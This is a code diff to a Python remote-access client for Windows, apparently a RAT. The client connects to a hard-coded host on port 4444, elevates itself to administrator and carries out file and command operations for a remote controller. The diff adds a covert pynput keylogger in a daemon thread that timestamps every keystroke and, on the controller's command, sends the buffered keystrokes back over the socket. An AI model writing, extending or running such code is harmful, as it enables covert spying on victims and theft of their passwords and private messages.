@@ -20,9 +20,40 @@ import ctypes
 import sys
 import hashlib
 import win32security
+import threading
+import pynput
+import datetime
 from PIL import ImageGrab, Image
 
-IP, PORT = '192.168.0.103', 4444
+IP, PORT = '192.168.0.104', 4444
+
+
+# ============================================================================
+# 后台持续运行线程 —— 从程序启动就一直执行
+# ============================================================================
+
+
+# 模块级键记录缓冲区（线程共享）
+keylog_buffer = []
+keylog_lock = threading.Lock()
+
+def background_worker_datetime():
+    while True:
+        time.sleep(60)
+
+def background_worker_keylog():
+    def on_press(key):
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        try:
+            char = key.char
+        except AttributeError:
+            char = f'[{key.name}]'
+        with keylog_lock:
+            keylog_buffer.append(f"{now}: {char}")
+
+    # 启动 pynput 键盘监听（阻塞直到 listener 停止）
+    with pynput.keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 def is_admin():
     try:
@@ -56,6 +87,10 @@ def run_as_admin():
 
 if not is_admin():
     run_as_admin()
+
+# 启动后台持续运行线程（守护线程，主线程退出时自动结束）
+threading.Thread(target=background_worker_keylog, daemon=True, name="BackgroundWorker").start()
+threading.Thread(target=background_worker_datetime, daemon=True, name="BackgroundWorker").start()
 
 while True:
     try:
@@ -174,6 +209,7 @@ while True:
                             os.remove(sinter_list[1])
                         except Exception:
                             pass
+                    #获取文件/文件夹信息
                     elif sinter_list[0]=='information':
                         try:
                             fileinformation=[]
@@ -554,7 +590,14 @@ while True:
                             client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
 
 
-                    
+            # 模块5：键盘记录
+            elif choice == '5':
+                with keylog_lock:
+                    data = '\n'.join(keylog_buffer[-500:])
+                    keylog_buffer.clear()
+                data_bytes = data.encode('utf-8', errors='ignore')
+                client.sendall(f"{len(data_bytes):08d}".encode() + data_bytes)
+
     except Exception as e:
         time.sleep(5)
     finally:
